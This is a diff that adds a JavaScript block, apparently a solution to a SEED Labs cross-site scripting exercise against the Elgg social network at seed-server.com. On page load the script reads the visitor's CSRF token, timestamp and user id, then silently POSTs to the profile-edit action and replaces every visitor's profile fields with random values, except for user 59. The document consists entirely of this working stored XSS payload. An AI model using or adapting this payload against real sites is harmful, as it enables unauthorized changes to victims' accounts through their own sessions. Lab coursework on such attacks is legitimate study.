@@ -1,0 +1,56 @@
+<script type="text/javascript">
+	window.onload = function(){
+    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+    const numbers = '0123456789';
+
+    function randomString(length, char) {
+        let result = '';
+        const charLength = char.length;
+        for (let i = 0; i < length; i++) {
+            result += char.charAt(Math.floor(Math.random() * charLength));
+        }
+        return result;
+    }
+
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+    var name="&name="+randomString(8, characters+numbers);
+    var description="&description="+randomString(8, characters);
+    var accesslevel="&accesslevel[description]=1";
+    var briefdescription="&briefdescription=1905088";
+    var accesslevel2="&accesslevel[briefdescription]=1";
+    var location="&location="+randomString(8, characters+numbers);
+    var accesslevel3="&accesslevel[location]=1";
+    var interests="&interests="+randomString(8, characters);
+    var accesslevel4="&accesslevel[interests]=1";
+    var skills="&skills="+randomString(8, characters);
+    var accesslevel5="&accesslevel[skills]=1";
+    var contactemail="&contactemail="+randomString(8,characters+numbers)+"@gmail.com";
+    var accesslevel6="&accesslevel[contactemail]=1";
+    var phone="&phone="+randomString(8, numbers);
+    var accesslevel7="&accesslevel[phone]=1";
+    var mobile="&mobile="+randomString(11, numbers);
+    var accesslevel8="&accesslevel[mobile]=1";
+    var website="&website=www."+randomString(8, characters)+".com";
+    var accesslevel9="&accesslevel[website]=1";
+    var twitter="&twitter="+randomString(8, characters+numbers);
+    var accesslevel10="&accesslevel[twitter]=1";
+    var guid="&guid="+elgg.session.user.guid;
+
+	//Construct the content of your url.
+        var sendurl="http://www.seed-server.com/action/profile/edit";
+	    var content=token+ts+name+description+accesslevel+briefdescription+accesslevel2+location+accesslevel3+interests+accesslevel4+skills+accesslevel5+contactemail+accesslevel6+phone+accesslevel7+mobile+accesslevel8+website+accesslevel9+twitter+accesslevel10+guid;
+	
+	if(elgg.session.user.guid!=59)
+	{
+		//Create and send Ajax request to modify profile
+		var Ajax=null;
+		Ajax=new XMLHttpRequest();
+		Ajax.open("POST",sendurl,true);
+		Ajax.setRequestHeader("Host","www.seed-server.com");
+		Ajax.setRequestHeader("Content-Type",
+		"application/x-www-form-urlencoded");
+		Ajax.send(content);
+	}
+	}
+</script>
